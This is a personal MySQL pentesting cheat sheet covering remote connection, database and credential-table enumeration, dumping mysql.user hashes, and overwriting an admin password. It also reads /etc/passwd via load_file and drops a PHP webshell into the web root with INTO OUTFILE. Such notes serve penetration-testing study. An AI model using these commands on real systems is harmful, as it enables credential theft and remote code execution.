# MySQL — Pentesting Reference

---

## Connecting

```bash
# Remote connection (from Kali)
mysql -u <user> -p'<password>' -h <target-ip>

# Remote — specify database directly
mysql -u <user> -p'<password>' -h <target-ip> <database>

# Local connection (from shell on target)
mysql -u <user> -p'<password>' <database>

#if ever you get a "ERROR 2026 (HY000): TLS/SSL error: self-signed certificate in certificate chain" append 
--skip-ssl

```
→ If the remote connection gets `Host not allowed`, MySQL is locked to localhost only. You need a shell on the box first, then connect locally.

---

## Navigation

```sql
show databases;
```
→ Lists all databases on the server. Look for non-default names — anything that isn't `information_schema`, `mysql`, `performance_schema`, or `sys` is custom and worth digging into.

```sql
use <database>;
```
→ Switches into a database so your queries run against it.

```sql
show tables;
```
→ Lists all tables in the current database. `users`, `accounts`, `members`, `credentials` are the ones to hit first.

```sql
describe <table>;
```
→ Shows the column names and data types for a table. Use this before selecting to know what columns exist.

```sql
select * from <table>;
```
→ Dumps all rows and columns from a table. If the table is large, use `limit`: `select * from users limit 10;`

```sql
select username, password from users;
```
→ Selects specific columns only. Use this when `describe` shows you which columns hold credentials.

---

## Writing to a Table (needs UPDATE priv on the DB)

```sql
update <table> set <column>='<value>' where <pk_column>='<row_id>';
```
→ Overwrite a field in an existing row. The `where` is mandatory — without it you change EVERY row. Success returns `Rows matched: 1  Changed: 1` (that's also your write-access test — a `command denied` means no UPDATE priv).

Example:
```sql
update planning_user set password='<known-plaintext-hash>' where user_id='ADM';
```

---

## What to Look For

Once inside a database, prioritize:

1. **Users table** — usernames and password hashes/encoded strings
2. **Config tables** — may store API keys, credentials, or paths
3. **Admin tables** — admin accounts often have reused passwords

Passwords in databases are commonly stored as:
- Plaintext (rare but happens)
- MD5 / SHA1 hashes → crack with hashcat or john
- Base64 encoded → `echo "<string>" | base64 -d`
- Double base64 → `echo "<string>" | base64 -d | base64 -d`
- bcrypt → harder to crack, try anyway

---

## MySQL User Enumeration

```sql
select user, host, authentication_string from mysql.user;
```
→ Dumps all MySQL user accounts and their password hashes. Requires access to the `mysql` system database — usually only available as root.

```sql
show grants;                     -- your own account
```

---

## Reading Files (if FILE privilege exists)

```sql
select load_file('/etc/passwd');
```
→ Reads a file off the server's filesystem (not the DB). Needs global `FILE` priv + `secure_file_priv` allowing the path — check: `SELECT @@secure_file_priv;` (path = that dir only, empty = anywhere, NULL = off).

---

## Writing Files — Webshell Drop

```sql
select "<?php system($_GET['cmd']); ?>" into outfile '/var/www/html/shell.php';
```
→ Writes a PHP webshell directly to the web root. If MySQL runs with write access to the web directory, this gives you RCE immediately. Visit `http://<target>/shell.php?cmd=id` to confirm execution.

→ **Needs all 3 — miss one and it fails:**
- **`FILE` privilege** — a global `ON *.*` grant. DB-level `ALL PRIVILEGES ON db.*` does NOT include it.
- **`secure_file_priv`** — the dir MySQL is pinned to. If it's a path like `/var/lib/mysql-files/` (the default), you can ONLY write there → useless for a webshell. Empty = anywhere, NULL = off.
- **Writable path** — the `mysql` OS user must be able to write it. `/var/www` is usually root/www-data owned → dead end.

---

## SQL Injection against MySQL

Detecting and exploiting SQLi (manual detection, login auth bypass, UNION extraction) lives in **[[SQL_Injection]]**. Burp Intruder mechanics (payload markers, attack types, spotting hits) live in **[[BurpSuite]] → Intruder**.

---

## Related Notes

- [[SQL_Injection]]
- [[BurpSuite]]
- [[Web_Enum]]
- [[Linux_Common_Commands]]
- [[File_Transfer]]
